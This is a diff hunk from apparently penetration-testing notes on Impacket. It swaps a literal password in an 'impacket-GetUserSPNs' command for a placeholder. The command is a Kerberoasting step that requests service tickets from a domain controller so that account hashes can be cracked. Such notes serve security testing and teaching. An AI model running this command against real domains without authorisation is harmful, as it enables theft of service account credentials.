@@ -75,7 +75,7 @@ Impacket
 ## Command
 
 ```bash
-impacket-GetUserSPNs 'CORP.LOCAL/rsmith:P@ssword123!' \
+impacket-GetUserSPNs 'CORP.LOCAL/rsmith:<password>!' \
 -dc-ip 192.168.56.10 \
 -request
 ```
